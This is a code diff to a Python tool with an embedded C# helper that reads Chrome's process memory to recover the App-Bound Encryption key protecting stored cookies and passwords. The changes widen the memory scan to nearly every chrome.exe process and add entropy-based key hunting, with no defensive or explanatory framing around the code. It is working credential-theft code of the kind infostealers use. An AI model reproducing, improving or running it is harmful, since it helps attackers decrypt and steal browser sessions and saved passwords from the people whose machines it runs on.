@@ -3280,12 +3280,13 @@ def _chrome_pid_score(command_line: str) -> int:
 
 
 def _chrome_abe_cmd_ok(command_line: str) -> bool:
-    """Browser (no --type=) or network utility only. Never renderer/gpu heaps."""
-    return _chrome_pid_score(command_line) <= 1
+    """Include unless the command line is a known renderer/gpu/crashpad."""
+    return _chrome_pid_score(command_line) < 9
 
 
 def _chrome_pids_prioritized() -> list[int]:
-    """Network service + browser only. Never return renderer PIDs."""
+    """Prefer browser/network; if that filter is empty, use every chrome.exe."""
+    all_pids = _chrome_pids()
     scored: list[tuple[int, int]] = []
     try:
         ps = _windows_powershell()
@@ -3307,8 +3308,17 @@ def _chrome_pids_prioritized() -> list[int]:
                 scored.append((_chrome_pid_score(cmd), int(pid_s)))
     except (OSError, subprocess.SubprocessError):
         scored = []
-    keep = [pid for score, pid in sorted(scored) if score <= 1]
-    return keep
+    preferred = [pid for score, pid in sorted(scored) if score <= 1]
+    rest = [
+        pid
+        for score, pid in sorted(scored)
+        if 1 < score < 9 and pid not in preferred
+    ]
+    if preferred:
+        return preferred + rest
+    if rest:
+        return rest
+    return all_pids
 
 
 def _canonical_ptr(addr: int) -> int:
@@ -3425,7 +3435,7 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         return None, "memscan:no_ctypes"
     pids = _chrome_pids_prioritized()
     if not pids:
-        return None, "memscan:no_browser"
+        return None, "memscan:no_chrome"
     kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
     kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
     kernel32.OpenProcess.restype = wintypes.HANDLE
@@ -3497,7 +3507,8 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
             return cand
         return None
 
-    for pid in pids:
+    for idx, pid in enumerate(pids):
+        entropy = idx < 4
         if time.monotonic() > deadline or scanned >= _ABE_MEMSCAN_MAX_BYTES:
             break
         handle = kernel32.OpenProcess(
@@ -3561,7 +3572,7 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                             hit = consider(cand)
                             if hit:
                                 return hit, "ok"
-                        if mtype == MEM_PRIVATE and size <= 2 << 20:
+                        if entropy and mtype == MEM_PRIVATE and size <= 2 << 20:
                             for cand in _aligned_entropy_keys(data):
                                 if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
                                     break
@@ -3863,14 +3874,23 @@ class K {
     finally { CloseHandle(h); }
   }
 
-  static bool AbePid(int pid) {
-    string cmd = CmdLine(pid);
+  static bool SkipPid(string cmd) {
     if (string.IsNullOrEmpty(cmd)) return false;
+    string c = cmd.ToLowerInvariant();
+    return c.Contains("--type=renderer") || c.Contains("--type=gpu")
+      || c.Contains("crashpad-handler") || c.Contains("type=crashpad");
+  }
+
+  static bool PreferPid(string cmd) {
+    if (string.IsNullOrEmpty(cmd)) return true;
     string c = cmd.ToLowerInvariant();
     if (c.Contains("network.mojom.networkservice") || c.Contains("service-sandbox-type=network"))
       return true;
-    if (c.Contains("--type=")) return false;
-    return true;
+    return !c.Contains("--type=");
+  }
+
+  static bool AbePid(int pid) {
+    return !SkipPid(CmdLine(pid));
   }
 
   static bool InitAes(byte[] sample) {
@@ -3958,7 +3978,7 @@ class K {
     }
   }
 
-  static void ScanPid(int pid, List<byte[]> found, HashSet<string> seen, ref int scanned, int deadline) {
+  static void ScanPid(int pid, List<byte[]> found, HashSet<string> seen, ref int scanned, int deadline, bool entropy) {
     IntPtr h = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED, false, pid);
     if (h == IntPtr.Zero) h = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
     if (h == IntPtr.Zero) return;
@@ -4021,7 +4041,7 @@ class K {
                 TryKey(key, found, seen);
               }
             }
-            if (mtype == MEM_PRIVATE && size <= 2 * 1024 * 1024) {
+            if (entropy && mtype == MEM_PRIVATE && size <= 2 * 1024 * 1024) {
               for (int i = 0; i + 32 <= read && found.Count < MAX_CAND; i += 8) {
                 byte[] key = new byte[32];
                 Buffer.BlockCopy(buf, i, key, 0, 32);
@@ -4038,23 +4058,34 @@ class K {
   }
 
   static List<int> Pids() {
-    var list = new List<int>();
+    var raw = new List<int>();
     string env = Environment.GetEnvironmentVariable("KANNON_CHROME_PIDS");
     if (!string.IsNullOrEmpty(env)) {
       foreach (var part in env.Split(',')) {
         int pid;
-        if (int.TryParse(part.Trim(), out pid) && pid > 0 && AbePid(pid)) list.Add(pid);
+        if (int.TryParse(part.Trim(), out pid) && pid > 0) raw.Add(pid);
       }
-      if (list.Count > 0) return list;
     }
-    try {
-      foreach (var p in Process.GetProcessesByName("chrome")) {
-        try {
-          if (AbePid(p.Id)) list.Add(p.Id);
-        } catch {}
-      }
-    } catch {}
-    return list;
+    if (raw.Count == 0) {
+      try {
+        foreach (var p in Process.GetProcessesByName("chrome")) {
+          try { raw.Add(p.Id); } catch {}
+        }
+      } catch {}
+    }
+    var prefer = new List<int>();
+    var rest = new List<int>();
+    foreach (int pid in raw) {
+      string cmd = CmdLine(pid);
+      if (SkipPid(cmd)) continue;
+      if (PreferPid(cmd)) prefer.Add(pid);
+      else rest.Add(pid);
+    }
+    if (prefer.Count + rest.Count > 0) {
+      prefer.AddRange(rest);
+      return prefer;
+    }
+    return raw;
   }
 
   static int Main() {
@@ -4070,16 +4101,18 @@ class K {
     }
     if (!InitAes(sample)) { FailHr("memscan:aes"); return 6; }
     var pids = Pids();
-    if (pids.Count == 0) { FailHr("memscan:no_browser"); return 3; }
+    if (pids.Count == 0) { FailHr("memscan:no_chrome"); return 3; }
     var found = new List<byte[]>();
     var seen = new HashSet<string>();
     int scanned = 0;
     int deadline = Environment.TickCount + 4500;
     int opened = 0;
+    int idx = 0;
     foreach (int pid in pids) {
       IntPtr probe = OpenProcess(PROCESS_QUERY_LIMITED, false, pid);
       if (probe != IntPtr.Zero) { CloseHandle(probe); opened++; }
-      ScanPid(pid, found, seen, ref scanned, deadline);
+      ScanPid(pid, found, seen, ref scanned, deadline, idx < 4);
+      idx++;
       if (found.Count >= MAX_CAND || Environment.TickCount > deadline) break;
     }
     if (hAlgGlobal != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlgGlobal, 0);
